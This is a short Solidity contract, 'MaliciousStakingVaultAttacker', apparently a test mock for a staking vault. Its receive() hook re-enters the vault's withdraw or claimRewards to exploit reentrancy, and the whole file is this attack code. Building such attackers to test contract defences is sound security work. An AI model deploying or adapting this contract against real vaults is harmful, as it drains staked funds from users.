// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IStakingVault {
    function stake(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function claimRewards() external;
}

contract MaliciousStakingVaultAttacker {
    IStakingVault public immutable vault;
    IERC20 public immutable stakingToken;
    uint256 public attackAmount;
    bool public attackRewards;

    constructor(address _vault, address _stakingToken) {
        vault = IStakingVault(_vault);
        stakingToken = IERC20(_stakingToken);
    }

    function stake(uint256 amount) external {
        stakingToken.transferFrom(msg.sender, address(this), amount);
        stakingToken.approve(address(vault), amount);
        vault.stake(amount);
    }

    function attackWithdraw(uint256 amount) external {
        attackRewards = false;
        attackAmount = amount;
        vault.withdraw(amount);
    }

    function attackClaimRewards() external {
        attackRewards = true;
        vault.claimRewards();
    }

    receive() external payable {
        if (attackRewards) {
            vault.claimRewards();
        } else {
            vault.withdraw(attackAmount);
        }
    }
}
